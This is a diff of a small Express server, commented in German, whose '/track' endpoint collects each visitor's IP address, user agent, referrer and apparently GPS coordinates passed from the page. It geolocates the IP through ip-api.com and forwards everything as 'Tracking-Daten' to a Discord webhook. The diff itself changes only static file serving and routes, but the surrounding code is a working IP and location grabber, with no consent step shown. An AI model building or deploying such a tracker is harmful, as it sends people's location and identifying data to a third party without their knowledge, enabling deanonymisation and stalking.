@@ -1,28 +1,36 @@
 // server.js — nur Discord, keine DB
 const express = require('express');
 const axios = require('axios');
+const path = require('path');
 
 const app = express();
 const port = process.env.PORT || 3000;
 
 app.set('trust proxy', true);
 app.use(express.json());
-app.use(express.static('public')); // / -> public/index.html
+
+// STATIC: absoluter Pfad auf ./public
+const publicDir = path.join(__dirname, 'public');
+app.use(express.static(publicDir));
+
+// Health (für Render)
+app.get('/health', (_, res) => res.send('ok'));
+
+// Root -> index.html ausliefern (damit es NIE "Cannot GET /" gibt)
+app.get('/', (_, res) => {
+  res.sendFile(path.join(publicDir, 'index.html'));
+});
 
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
-// IP ermitteln (Proxy-freundlich)
+// IP (Proxy-freundlich)
 function getClientIp(req) {
-  // Render setzt x-forwarded-for korrekt
   const xf = req.headers['x-forwarded-for'] || req.headers['x-real-ip'];
   if (xf) return String(xf).split(',')[0].trim().replace(/^::ffff:/, '');
   return (req.socket?.remoteAddress || '').replace(/^::ffff:/, '');
 }
 
-// Health (für Render)
-app.get('/health', (_, res) => res.send('ok'));
-
-// Track: nimmt Daten aus Query (vom HTML) und postet zu Discord
+// Track
 app.get('/track', async (req, res) => {
   const ip = getClientIp(req);
   const userAgent = req.headers['user-agent'] || '';
@@ -34,7 +42,7 @@ app.get('/track', async (req, res) => {
     referrer
   } = req.query;
 
-  // optional: IP-Geolocation (GPS hat Vorrang, falls vorhanden)
+  // optionale IP-Geolocation
   let location = {};
   try {
     const r = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 4000 });
@@ -48,7 +56,7 @@ app.get('/track', async (req, res) => {
         isp: r.data.isp
       };
     }
-  } catch { /* egal */ }
+  } catch {}
 
   const embeds = [{
     title: 'Tracking-Daten',
@@ -91,8 +99,7 @@ app.get('/track', async (req, res) => {
   res.send('Daten empfangen');
 });
 
-// WICHTIG: **KEINE** eigene Root-Route, damit / die public/index.html lädt!
-
 app.listen(port, () => {
   console.log(`Server läuft auf Port ${port}`);
 });
+
